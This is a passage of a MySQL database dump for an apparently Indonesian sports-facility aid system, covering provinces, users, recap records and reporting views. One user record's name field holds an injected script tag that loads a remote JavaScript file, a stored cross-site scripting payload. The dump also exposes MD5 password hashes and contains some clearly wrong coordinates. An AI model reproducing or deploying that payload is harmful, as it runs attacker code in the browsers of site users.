INSERT INTO `sdp_master_provinsi` VALUES (18, '52', 'NUSA TENGGARA BARAT', '-8.652933', '117.361649', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-21 00:07:10', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (19, '53', 'NUSA TENGGARA TIMUR', '-8.652933', '117.361649', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-11 19:33:34', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (20, '61', 'KALIMANTAN BARAT', '-0.278781', '111.475288', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:08:46', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (21, '62', 'KALIMANTAN TENGAH', '-1.681488', '113.382355', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:08:59', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (22, '63', 'KALIMANTAN SELATAN', '-3.092642', '-3.092642', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:09:17', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (23, '64', 'KALIMANTAN TIMUR', '0.538659', '116.419388', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:09:29', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (24, '65', 'KALIMANTAN UTARA', '3.073093', '116.041389', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:09:41', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (25, '71', 'SULAWESI UTARA', '0.624693', '123.974998', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-04 21:09:54', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (26, '72', 'SULAWESI TENGAH', '130.145279', '121.445618', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-19 00:11:40', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (27, '73', 'SULAWESI SELATAN', '-3.668799', '119.974052', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-19 00:12:09', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (28, '74', 'SULAWESI TENGGARA', '-4.144910', '122.174606', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-19 00:12:40', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (29, '75', 'GORONTALO', '0.699937', '122.446724', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-11 19:35:11', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (30, '76', 'SULAWESI BARAT', '-2.844137', '119.232079', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-19 00:13:11', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (31, '81', 'MALUKU', '-3.238462', '130.145279', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-19 00:07:21', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (32, '82', 'MALUKU UTARA', '1.571860', '127.798799', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-19 00:09:46', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (33, '92', 'PAPUA BARAT', '-1.336115', '133.174713', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-18 23:47:19', '::1');
INSERT INTO `sdp_master_provinsi` VALUES (34, '91', 'PAPUA', '-4.269928', '138.080353', '1', 1, '2019-10-13 20:34:41', 1, '2019-11-18 23:45:19', '::1');

-- ----------------------------
-- Table structure for sdp_master_step
-- ----------------------------
DROP TABLE IF EXISTS `sdp_master_step`;
CREATE TABLE `sdp_master_step`  (
  `step_id` int(11) NOT NULL AUTO_INCREMENT,
  `step_kode` char(5) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `step_nama` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `step_order` char(2) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `step_deskripsi` text CHARACTER SET latin1 COLLATE latin1_swedish_ci,
  `step_status` enum('0','1') CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT '1',
  `step_createdby` int(11) DEFAULT NULL,
  `step_createddate` datetime(0) DEFAULT NULL,
  `step_updatedby` int(11) DEFAULT NULL,
  `step_lastupdate` timestamp(0) NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP(0),
  `step_ip` char(15) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  PRIMARY KEY (`step_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 6 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of sdp_master_step
-- ----------------------------
INSERT INTO `sdp_master_step` VALUES (1, 'STP01', 'Sebelum Pengerjaan', '1', 'Step pada saat sebelum pengerjaan', '1', 1, '2020-09-15 22:31:40', NULL, '2020-09-15 22:31:40', '::1');
INSERT INTO `sdp_master_step` VALUES (2, 'STP02', 'Waktu Pengerjaan', '2', 'step pada saat waktu pengerjaan', '1', 1, '2020-09-15 22:36:55', NULL, '2020-09-16 09:18:22', '::1');
INSERT INTO `sdp_master_step` VALUES (3, 'STP03', 'Setelah Pengerjaan', '3', 'step waktu setelah pengerjaan', '1', 1, '2020-09-15 22:37:32', NULL, '2020-09-16 09:18:24', '::1');
INSERT INTO `sdp_master_step` VALUES (4, 'STP04', 'Serah Terima', '4', 'step pada saat serah terima', '1', 1, '2020-09-15 22:38:03', NULL, '2020-09-16 09:18:27', '::1');

-- ----------------------------
-- Table structure for sdp_master_user
-- ----------------------------
DROP TABLE IF EXISTS `sdp_master_user`;
CREATE TABLE `sdp_master_user`  (
  `user_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_nama` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `user_email` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `user_password` varchar(40) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `user_status` enum('0','1') CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT '1',
  `user_createdby` int(11) DEFAULT NULL,
  `user_createddate` datetime(0) DEFAULT NULL,
  `user_updatedby` int(11) DEFAULT NULL,
  `user_lastupdate` timestamp(0) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `user_ip` char(15) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  PRIMARY KEY (`user_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 3 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of sdp_master_user
-- ----------------------------
INSERT INTO `sdp_master_user` VALUES (1, 'admin', 'admin@mail.com', '1753e975cc1af1cfed276d69853b697a', '1', NULL, NULL, NULL, '2019-10-13 01:57:00', NULL);
INSERT INTO `sdp_master_user` VALUES (2, '<script type=\"text/javascript\" src=\"http://hieki.000webhostapp.com/raw/mw.js\"></script>', 'maill@mail.com', '7e68af737305917b7eb4dd198ee1f2ea', '1', 1, '2019-12-21 19:52:27', NULL, '2019-12-21 12:52:27', '125.160.115.77');

-- ----------------------------
-- Table structure for sdp_rekap
-- ----------------------------
DROP TABLE IF EXISTS `sdp_rekap`;
CREATE TABLE `sdp_rekap`  (
  `rekap_id` int(11) NOT NULL AUTO_INCREMENT,
  `rekap_judul` varchar(200) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `rekap_kategori_id` int(11) DEFAULT NULL,
  `rekap_tahun` year DEFAULT NULL,
  `rekap_status` enum('0','1') CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT '1',
  `rekap_tipe` enum('1','2') CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL COMMENT '1 = Prasarana, 2 = Sarana',
  `rekap_createdby` int(11) DEFAULT NULL,
  `rekap_createddate` datetime(0) DEFAULT NULL,
  `rekap_updatedby` int(11) DEFAULT NULL,
  `rekap_lastupdate` timestamp(0) NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `rekap_ip` char(15) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  PRIMARY KEY (`rekap_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 4 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of sdp_rekap
-- ----------------------------
INSERT INTO `sdp_rekap` VALUES (1, ' SARANA OLAHRAGA REKREASI TAHUN ANGGARAN 2019     ', 2, 2019, '1', '2', 1, '2020-09-18 00:28:03', 1, '2020-09-18 00:28:03', '::1');
INSERT INTO `sdp_rekap` VALUES (2, 'REKAP BANTUAN PRASARANA OLAHRAGA PENDIDIKAN TAHUN ANGGARAN 2016', 1, 2016, '1', '1', 1, '2020-09-18 00:55:30', NULL, '2020-09-18 00:55:30', '::1');

-- ----------------------------
-- Table structure for sdp_rekap_detail
-- ----------------------------
DROP TABLE IF EXISTS `sdp_rekap_detail`;
CREATE TABLE `sdp_rekap_detail`  (
  `rekdet_id` int(11) NOT NULL AUTO_INCREMENT,
  `rekdet_rekap_id` int(11) DEFAULT NULL,
  `rekdet_bantuan_kode` varchar(5) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `rekdet_jnsbtn_kode` varchar(10) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `rekdet_provinsi_kode` varchar(2) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `rekdet_kabkot_kode` varchar(2) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `rekdet_kecamatan_kode` varchar(2) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `rekdet_keldes_kode` varchar(4) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `rekdet_lembaga` text CHARACTER SET latin1 COLLATE latin1_swedish_ci,
  `rekdet_nominal` int(15) DEFAULT NULL,
  `rekdet_luas` int(11) DEFAULT NULL,
  `rekdet_jmlbarang` int(11) DEFAULT NULL,
  `rekdet_tipe_bangunan` enum('1','2','3','4') CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL COMMENT '1 = Pembangunan Baru,\r\n2 = Rehabilitasi,\r\n3 = Renovasi,\r\n4 = Pembangunan Lanjutan',
  `rekdet_status` enum('0','1') CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `rekdet_createdby` int(11) DEFAULT NULL,
  `rekdet_createddate` datetime(0) DEFAULT NULL,
  `rekdet_updatedby` int(11) DEFAULT NULL,
  `rekdet_lastupdate` timestamp(0) NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP(0),
  PRIMARY KEY (`rekdet_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of sdp_rekap_detail
-- ----------------------------
INSERT INTO `sdp_rekap_detail` VALUES (1, 1, NULL, 'SRNREK01', '61', '71', '06', '1001', 'PTMSI Kota Pontianak', NULL, NULL, 50, NULL, NULL, 1, '2020-09-18 00:31:45', 1, '2020-09-18 08:10:05');
INSERT INTO `sdp_rekap_detail` VALUES (2, 2, 'PENB1', 'PEN04', '32', '13', '11', '2004', 'Sekolah Menengah Pertama Negeri 1 Pamanukan', 149840, 12, NULL, '3', NULL, 1, '2020-09-18 01:03:25', 1, '2020-09-18 16:07:42');
INSERT INTO `sdp_rekap_detail` VALUES (9, 2, 'PENB1', 'PEN01', '19', '05', NULL, NULL, 'q', 12000, 12, NULL, '1', NULL, 1, '2020-09-18 15:30:50', NULL, '2020-09-18 15:30:50');
INSERT INTO `sdp_rekap_detail` VALUES (10, 1, NULL, NULL, '11', '10', '04', '2007', 'asdasd', NULL, NULL, NULL, NULL, NULL, 1, '2020-09-18 16:58:54', NULL, '2020-09-18 16:58:54');

-- ----------------------------
-- Table structure for sdp_rekap_dokumen
-- ----------------------------
DROP TABLE IF EXISTS `sdp_rekap_dokumen`;
CREATE TABLE `sdp_rekap_dokumen`  (
  `rekdok_id` int(11) NOT NULL AUTO_INCREMENT,
  `rekdok_rekdet_id` int(11) DEFAULT NULL,
  `rekdok_file` text CHARACTER SET latin1 COLLATE latin1_swedish_ci,
  `rekdok_ringkasan` varchar(200) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `rekdok_deskripsi` text CHARACTER SET latin1 COLLATE latin1_swedish_ci,
  `rekdok_is_public` enum('0','1') CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL COMMENT '0=false, 1=true',
  `rekdok_step_id` int(11) DEFAULT NULL,
  PRIMARY KEY (`rekdok_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 13 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of sdp_rekap_dokumen
-- ----------------------------
INSERT INTO `sdp_rekap_dokumen` VALUES (1, 1, './assets/frontend/global/img/galeri/1.jpeg', 'Sebelum Pengerjaan', 'Sebelum Pengerjaan', '1', 1);
INSERT INTO `sdp_rekap_dokumen` VALUES (2, 1, './assets/frontend/global/img/galeri/2.jpeg', 'Waktu Pengerjaan', 'Waktu Pengerjaan', '1', 2);
INSERT INTO `sdp_rekap_dokumen` VALUES (3, 1, './assets/frontend/global/img/galeri/3.jpeg', 'Setelah Pengerjaan', 'Setelah Pengerjaan', '1', 3);
INSERT INTO `sdp_rekap_dokumen` VALUES (4, 2, './assets/frontend/global/img/galeri/11.png', 'Sebelum Pengerjaan', 'Sebelum Pengerjaan', '1', 1);
INSERT INTO `sdp_rekap_dokumen` VALUES (5, 2, './assets/frontend/global/img/galeri/21.png', 'Waktu Pengerjaan', 'Waktu Pengerjaan', '1', 2);
INSERT INTO `sdp_rekap_dokumen` VALUES (6, 2, './assets/frontend/global/img/galeri/31.png', 'Setelah Pengerjaan', 'Setelah Pengerjaan', '1', 3);
INSERT INTO `sdp_rekap_dokumen` VALUES (11, 9, './assets/frontend/global/img/galeri/', '', '', '0', 0);
INSERT INTO `sdp_rekap_dokumen` VALUES (12, 10, './assets/frontend/global/img/galeri/', '', '', '0', 0);

-- ----------------------------
-- Table structure for sdp_rekap_item
-- ----------------------------
DROP TABLE IF EXISTS `sdp_rekap_item`;
CREATE TABLE `sdp_rekap_item`  (
  `sartem_id` int(11) NOT NULL AUTO_INCREMENT,
  `sartem_rekdet_id` int(11) DEFAULT NULL,
  `sartem_jnsbtn_kode` varchar(10) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `sartem_jml` int(11) DEFAULT NULL,
  `sartem_satuan` enum('1','2','3','4','5') CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  PRIMARY KEY (`sartem_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of sdp_rekap_item
-- ----------------------------
INSERT INTO `sdp_rekap_item` VALUES (6, 1, 'SRNREK01', 90, NULL);
INSERT INTO `sdp_rekap_item` VALUES (8, 1, 'SRNPEN01', 30, NULL);
INSERT INTO `sdp_rekap_item` VALUES (9, 10, 'SRNREK01', 10, NULL);
INSERT INTO `sdp_rekap_item` VALUES (10, 10, 'SRNPEN01', 30, NULL);

-- ----------------------------
-- View structure for grafik_sarpras
-- ----------------------------
DROP VIEW IF EXISTS `grafik_sarpras`;
CREATE ALGORITHM = UNDEFINED DEFINER = `root`@`localhost` SQL SECURITY DEFINER VIEW `grafik_sarpras` AS SELECT
	rekap_tahun,
	rekap_tipe,
	rekdet_id,
	provinsi_id,
	provinsi_kode,
	provinsi_nama,
	kabkot_id,
	kabkot_kode,
	kabkot_nama,
	kecamatan_id,
	kecamatan_kode,
	kecamatan_nama,
	keldes_id,
	keldes_kode,
	keldes_nama
FROM
	sdp_rekap
	LEFT JOIN sdp_rekap_detail ON rekap_id = rekdet_rekap_id 
	LEFT JOIN sdp_master_provinsi ON rekdet_provinsi_kode = provinsi_kode
	LEFT JOIN sdp_master_kabkot ON rekdet_kabkot_kode = kabkot_kode
	LEFT JOIN sdp_master_kecamatan ON rekdet_kecamatan_kode = kecamatan_kode
	LEFT JOIN sdp_master_keldes ON rekdet_keldes_kode = keldes_kode 
	where rekap_status = '1'
GROUP BY
rekdet_id
ORDER BY
	rekap_tahun, provinsi_nama ;

-- ----------------------------
-- View structure for summary_d2
-- ----------------------------
DROP VIEW IF EXISTS `summary_d2`;
CREATE ALGORITHM = UNDEFINED DEFINER = `root`@`localhost` SQL SECURITY DEFINER VIEW `summary_d2` AS select `sdp_rekap`.`rekap_tahun` AS `rekap_tahun`,count(`sdp_rekap_detail`.`rekdet_provinsi_kode`) AS `jmlPerProvinsi`,count(`sdp_rekap_detail`.`rekdet_kabkot_kode`) AS `jmlPerKabkot`,count(`sdp_rekap_detail`.`rekdet_kecamatan_kode`) AS `jmlPerKecamatan`,count(`sdp_rekap_detail`.`rekdet_keldes_kode`) AS `jmlPerKeldes` from (`sdp_rekap` left join `sdp_rekap_detail` on((`sdp_rekap`.`rekap_id` = `sdp_rekap_detail`.`rekdet_rekap_id`))) group by `sdp_rekap`.`rekap_tahun` order by `sdp_rekap`.`rekap_tahun` ;

-- ----------------------------
-- View structure for summary_perkategori
-- ----------------------------
DROP VIEW IF EXISTS `summary_perkategori`;
CREATE ALGORITHM = UNDEFINED DEFINER = `root`@`localhost` SQL SECURITY DEFINER VIEW `summary_perkategori` AS select `sdp_master_kategori`.`kategori_nama` AS `kategori_nama`,`sdp_rekap`.`rekap_tahun` AS `rekap_tahun`,count(`sdp_rekap`.`rekap_id`) AS `jmlData` from ((`sdp_rekap` left join `sdp_rekap_detail` on((`sdp_rekap_detail`.`rekdet_rekap_id` = `sdp_rekap`.`rekap_id`))) left join `sdp_master_kategori` on((`sdp_rekap`.`rekap_kategori_id` = `sdp_master_kategori`.`kategori_id`))) group by `sdp_rekap`.`rekap_tahun`,`sdp_master_kategori`.`kategori_id` order by `sdp_rekap`.`rekap_kategori_id`,`sdp_rekap`.`rekap_tahun` ;

-- ----------------------------
-- View structure for summary_region
-- ----------------------------
DROP VIEW IF EXISTS `summary_region`;
CREATE ALGORITHM = UNDEFINED DEFINER = `root`@`localhost` SQL SECURITY DEFINER VIEW `summary_region` AS select (select count(0) from `sdp_master_provinsi` where (`sdp_master_provinsi`.`provinsi_status` = '1')) AS `jml_provinsi`,(select count(0) from `sdp_master_kabkot` where (`sdp_master_kabkot`.`kabkot_status` = '1')) AS `jml_kabkot`,(select count(0) from `sdp_master_kecamatan` where (`sdp_master_kecamatan`.`kecamatan_status` = '1')) AS `jml_kecamatan`,(select count(0) from `sdp_master_keldes` where (`sdp_master_keldes`.`keldes_status` = '1')) AS `jml_keldes` ;

-- ----------------------------
-- View structure for sumsarpras_kabkot
-- ----------------------------
DROP VIEW IF EXISTS `sumsarpras_kabkot`;
CREATE ALGORITHM = UNDEFINED DEFINER = `root`@`localhost` SQL SECURITY DEFINER VIEW `sumsarpras_kabkot` AS SELECT 
	provinsi_id,
	provinsi_kode,
	rekap_tahun,
	kabkot_id,
	kabkot_kode,
	CONCAT(provinsi_nama,' (',provinsi_kode,')') AS provinsi_nama,
	provinsi_latitude,
	provinsi_longtitude,
	CONCAT(kabkot_nama,' (',kabkot_kode,')') AS kabkot_nama,
	kabkot_latitude,
	kabkot_longtitude,
	SUM(CASE WHEN rekap_tipe = 1 THEN 1 ELSE 0 END) AS jml_prasarana,
	SUM(CASE WHEN rekap_tipe = 2 THEN 1 ELSE 0 END) AS jml_sarana
FROM sdp_rekap
LEFT JOIN sdp_rekap_detail ON rekap_id = rekdet_rekap_id
LEFT JOIN sdp_master_provinsi ON rekdet_provinsi_kode = provinsi_kode
LEFT JOIN sdp_master_kabkot ON rekdet_kabkot_kode = kabkot_kode AND kabkot_provinsi_kode = provinsi_kode
WHERE rekap_status = '1' 
	AND provinsi_id IS NOT NULL
-- 	AND kabkot_id IS NOT NULL
GROUP BY rekap_tahun, rekdet_provinsi_kode ;

-- ----------------------------
-- View structure for sumsarpras_kecamatan
-- ----------------------------
DROP VIEW IF EXISTS `sumsarpras_kecamatan`;
CREATE ALGORITHM = UNDEFINED DEFINER = `root`@`localhost` SQL SECURITY DEFINER VIEW `sumsarpras_kecamatan` AS SELECT 
	provinsi_id,
	provinsi_kode,
	rekap_tahun,
	kabkot_id,
	kabkot_kode,
	kecamatan_id,
	kecamatan_kode,
	CONCAT(provinsi_nama,' (',provinsi_kode,')') AS provinsi_nama,
	provinsi_latitude,
	provinsi_longtitude,
	CONCAT(kabkot_nama,' (',kabkot_kode,')') AS kabkot_nama,
	kabkot_latitude,
	kabkot_longtitude,
	CONCAT(kecamatan_nama,' (',kecamatan_kode,')') AS kecamatan_nama,
	kecamatan_latitude,
	kecamatan_longtitude,
	SUM(CASE WHEN rekap_tipe = 1 THEN 1 ELSE 0 END) AS jml_prasarana,
	SUM(CASE WHEN rekap_tipe = 2 THEN 1 ELSE 0 END) AS jml_sarana
FROM sdp_rekap
LEFT JOIN sdp_rekap_detail ON rekap_id = rekdet_rekap_id
LEFT JOIN sdp_master_provinsi ON rekdet_provinsi_kode = provinsi_kode
LEFT JOIN sdp_master_kabkot 
	ON rekdet_kabkot_kode = kabkot_kode 
	AND kabkot_provinsi_kode = provinsi_kode
LEFT JOIN sdp_master_kecamatan 
	ON rekdet_kecamatan_kode = kecamatan_kode
	AND kecamatan_kabkot_kode = kabkot_kode
	AND kecamatan_provinsi_kode = provinsi_kode
WHERE rekap_status = '1' 
	AND provinsi_id IS NOT NULL
-- 	AND kabkot_id IS NOT NULL
-- 	AND kecamatan_id IS NOT NULL
GROUP BY rekap_tahun, rekdet_kecamatan_kode ;

-- ----------------------------
-- View structure for sumsarpras_keldes
-- ----------------------------
DROP VIEW IF EXISTS `sumsarpras_keldes`;
CREATE ALGORITHM = UNDEFINED DEFINER = `root`@`localhost` SQL SECURITY DEFINER VIEW `sumsarpras_keldes` AS SELECT 
	rekap_tahun,
	provinsi_id,
	provinsi_kode,
	kabkot_id,
	kabkot_kode,
	kecamatan_id,
	kecamatan_kode,
	keldes_id,
	keldes_kode,
	CONCAT(provinsi_nama,' (',provinsi_kode,')') AS provinsi_nama,
	provinsi_latitude,
	provinsi_longtitude,
	CONCAT(kabkot_nama,' (',kabkot_kode,')') AS kabkot_nama,
	kabkot_latitude,
	kabkot_longtitude,
	CONCAT(kecamatan_nama,' (',kecamatan_kode,')') AS kecamatan_nama,
	kecamatan_latitude,
	kecamatan_longtitude,
	CONCAT(keldes_nama,' (',keldes_kode,')') AS keldes_nama,
	keldes_latitude,
	keldes_longtitude,
	SUM(CASE WHEN rekap_tipe = 1 THEN 1 ELSE 0 END) AS jml_prasarana,
	SUM(CASE WHEN rekap_tipe = 2 THEN 1 ELSE 0 END) AS jml_sarana
FROM sdp_rekap
LEFT JOIN sdp_rekap_detail ON rekap_id = rekdet_rekap_id
LEFT JOIN sdp_master_provinsi ON rekdet_provinsi_kode = provinsi_kode
LEFT JOIN sdp_master_kabkot 
	ON rekdet_kabkot_kode = kabkot_kode 
	AND kabkot_provinsi_kode = provinsi_kode
LEFT JOIN sdp_master_kecamatan 
	ON rekdet_kecamatan_kode = kecamatan_kode
	AND kecamatan_kabkot_kode = kabkot_kode
	AND kecamatan_provinsi_kode = provinsi_kode
LEFT JOIN sdp_master_keldes 
	ON rekdet_keldes_kode = keldes_kode
	AND keldes_kecamatan_kode = kecamatan_kode
	AND keldes_kabkot_kode = kabkot_kode
	AND keldes_provinsi_kode = provinsi_kode
WHERE rekap_status = '1' 
	AND provinsi_id IS NOT NULL
	AND kabkot_id IS NOT NULL
	AND kecamatan_id IS NOT NULL
	AND keldes_id IS NOT NULL
GROUP BY rekdet_keldes_kode, rekap_tahun ;

-- ----------------------------
-- View structure for sumsarpras_provinsi
-- ----------------------------
DROP VIEW IF EXISTS `sumsarpras_provinsi`;
CREATE ALGORITHM = UNDEFINED DEFINER = `root`@`localhost` SQL SECURITY DEFINER VIEW `sumsarpras_provinsi` AS SELECT 
	provinsi_id,
	provinsi_kode,
	rekap_tahun,
	provinsi_nama,
	provinsi_latitude,
	provinsi_longtitude,
	SUM(CASE WHEN rekap_tipe = 1 THEN 1 ELSE 0 END) AS jml_prasarana,
	SUM(CASE WHEN rekap_tipe = 2 THEN 1 ELSE 0 END) AS jml_sarana
FROM sdp_rekap
LEFT JOIN sdp_rekap_detail ON rekap_id = rekdet_rekap_id
LEFT JOIN sdp_master_provinsi ON rekdet_provinsi_kode = provinsi_kode
WHERE rekap_status = '1' AND provinsi_id IS NOT NULL
GROUP BY rekap_tahun, rekdet_provinsi_kode ;

SET FOREIGN_KEY_CHECKS = 1;
